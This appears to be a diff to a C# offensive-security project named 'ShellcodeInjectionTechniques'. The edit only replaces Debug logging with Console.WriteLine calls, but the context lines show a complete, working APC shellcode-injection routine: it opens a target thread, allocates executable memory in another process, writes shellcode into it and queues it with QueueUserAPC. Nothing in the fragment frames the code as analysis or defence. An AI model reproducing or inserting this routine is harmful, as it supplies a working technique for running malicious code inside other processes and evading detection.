@@ -12,22 +12,22 @@ namespace ShellcodeInjectionTechniques
         public void Run(Process target, byte[] shellcode)
         {
             ProcessThread thread = GetThread(target.Threads);
-            Debug("[+] Found thread: {0}", new string[] { thread.Id.ToString() });
+            Console.WriteLine("[+] Found thread: {0}", new string[] { thread.Id.ToString() });
 
             // get a handle to the thread
             IntPtr hThread = OpenThread(ThreadAccess.GET_CONTEXT | ThreadAccess.SET_CONTEXT, false, (UInt32)thread.Id);
-            Debug("[+] OpenThread() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });
+            Console.WriteLine("[+] OpenThread() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });
 
             // allocate some memory for our shellcode
             IntPtr pAddr = VirtualAllocEx(target.Handle, IntPtr.Zero, (UInt32)shellcode.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.PAGE_EXECUTE_READWRITE);
-            Debug("[+] VirtualAllocEx(), assigned: 0x{0}", new string[] { pAddr.ToString("X") });
+            Console.WriteLine("[+] VirtualAllocEx(), assigned: 0x{0}", new string[] { pAddr.ToString("X") });
 
             // write the shellcode into the allocated memory
-            Debug("[+] WriteProcessMemory() - remote address: 0x{0}", new string[] { pAddr.ToString("X") });
+            Console.WriteLine("[+] WriteProcessMemory() - remote address: 0x{0}", new string[] { pAddr.ToString("X") });
             WriteProcessMemory(target.Handle, pAddr, shellcode, shellcode.Length, out IntPtr lpNumberOfBytesWritten);
 
             // add an asynchronous procedure call
-            Debug("[+] QueueUserAPC() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });
+            Console.WriteLine("[+] QueueUserAPC() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });
             QueueUserAPC(pAddr, hThread, IntPtr.Zero);
         }
 
